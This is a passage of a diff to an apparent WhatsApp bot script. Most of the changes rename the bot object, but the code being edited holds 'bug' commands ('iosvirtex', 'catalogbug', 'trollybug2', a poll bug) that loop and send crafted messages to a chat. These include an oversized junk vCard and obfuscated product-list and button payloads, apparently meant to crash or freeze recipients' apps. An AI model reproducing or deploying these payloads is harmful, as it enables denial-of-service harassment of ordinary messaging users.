karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
-ElgazarBot.sendContact(m.chat, global.owner, fakeContacts)
+Elza3emgonBot.sendContact(m.chat, global.owner, fakeContacts)
 }
 }
 break
@@ -8155,7 +8133,7 @@ case 'iosvirtex': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-ElgazarBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
+Elza3emgonBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
 }
 }
 break
@@ -8165,7 +8143,7 @@ case 'iosvirtex5': {
 if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-ElgazarBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
+Elza3emgonBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
 }
 }
 break
@@ -8176,7 +8154,7 @@ if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 ydd = `${botname}`
 for (let i = 0; i < amount; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await ElgazarBot[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await Elza3emgonBot[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
@@ -8189,11 +8167,11 @@ if (args.length == 0) return m.reply(`اكتب ${prefix+command} والعدد\n�
 amount = `${encodeURI(q)}`
 ydd = `${botname}`
 for (let i = 0; i < amount; i++) {
-let teks = `══✪〘 *منشن للحلوين* 〙✪══
+let teks = `══✪〘 *منشن للاعضاء* 〙✪══
  ${themeemoji} *الرساله : ${q ? q : 'مفيش رساله'}*\n\n`
 for (let mem of participants) {
 teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
-ElgazarBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
+Elza3emgonBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
 }
 }
 break
@@ -8227,7 +8205,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "selectableOptionsCount": 5
 }
 }), { userJid: m.chat, quoted: doc })
-ElgazarBot.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+Elza3emgonBot.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 }
 xbug('Successful in sending the poll bug')
 }
@@ -8237,7 +8215,7 @@ case 'catalogbug': {
 
                 if (!isCreator) return m.reply(`${mess.owner}`)
                 if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: ElgazarBot.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: Elza3emgonBot.waUploadToServer })
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -8259,7 +8237,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "businessOwnerJid": "916909137213@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
-ElgazarBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+Elza3emgonBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 }
 break
@@ -8269,7 +8247,7 @@ case 'trollybug2': {
                 if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await ElgazarBot[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});ElgazarBot['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
